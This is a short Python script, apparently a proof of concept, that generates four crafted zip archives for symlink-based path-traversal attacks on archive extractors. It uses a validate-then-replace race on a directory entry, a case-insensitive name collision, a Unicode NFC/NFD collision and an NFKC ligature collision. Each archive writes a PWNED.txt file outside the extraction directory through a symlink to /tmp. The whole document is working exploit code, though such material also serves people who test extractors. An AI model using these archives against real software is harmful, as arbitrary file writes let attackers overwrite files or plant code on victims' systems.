import stat, unicodedata, zipfile

def sym(name):                       # a symlink entry
    zi = zipfile.ZipInfo(name); zi.create_system = 3
    zi.external_attr = (stat.S_IFLNK | 0o777) << 16
    return zi

# 1) cache-poisoning TOCTOU: validate d/sub, overwrite it with a symlink, write through it
with zipfile.ZipFile("toctou-slip.zip", "w") as z:
    z.writestr("d/sub/", b"")                  # dir (extractor validates/caches it)
    z.writestr(sym("d/sub"), "/tmp")           # same path -> symlink out
    z.writestr("d/sub/PWNED.txt", b"x")        # write through -> /tmp/PWNED.txt

# 2) case-insensitive collision (LINK vs link)
with zipfile.ZipFile("case-slip.zip", "w") as z:
    z.writestr(sym("LINK"), "/tmp")
    z.writestr("link/PWNED.txt", b"x")

# 3) Unicode NFC/NFD collision (café vs café)
with zipfile.ZipFile("unicode-slip.zip", "w") as z:
    z.writestr(sym(unicodedata.normalize("NFC", "café")), "/tmp")
    z.writestr(unicodedata.normalize("NFD", "café") + "/PWNED.txt", b"x")

# 4) Unicode NFKC compatibility collision (ﬁle vs file) — fools any extractor
#    that NFKC-normalizes names; note NFC==NFD here, so only NFKC triggers it
with zipfile.ZipFile("unicode-nfkc-slip.zip", "w") as z:
    z.writestr(sym("ﬁle"), "/tmp")            # "ﬁle" (U+FB01 fi ligature)
    z.writestr("file/PWNED.txt", b"x")             # "file" -> collides under NFKC
